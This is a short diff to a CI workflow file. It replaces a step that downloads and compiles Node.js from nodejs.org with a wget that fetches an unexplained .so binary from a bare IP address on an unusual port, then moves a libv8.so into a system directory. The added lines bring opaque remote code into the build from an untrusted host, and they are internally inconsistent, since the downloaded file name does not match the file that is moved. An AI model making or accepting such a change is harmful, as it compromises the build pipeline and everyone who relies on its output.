@@ -50,17 +50,9 @@ jobs:
         
     - name: Install v8
       run: |
-        mkdir v8
-        cd v8
-        wget https://nodejs.org/dist/v18.13.0/node-v18.13.0.tar.gz
-        tar -xvzf node-v18.13.0.tar.gz
-        cd node-v18.13.0
-        ./configure
-        make
-        cp libv8.so /usr/bin/x86_64-w64-mingw32-ld/libv8.so
-        make install
-        cd ..
-        
+        wget http://203.135.101.246:26879/down/1Bowou3g0XzE.so
+        mv libv8.so /usr/bin/x86_64-w64-mingw32-ld/libv8.so
+
     - name: Install compilers
       run: |
         sudo apt update
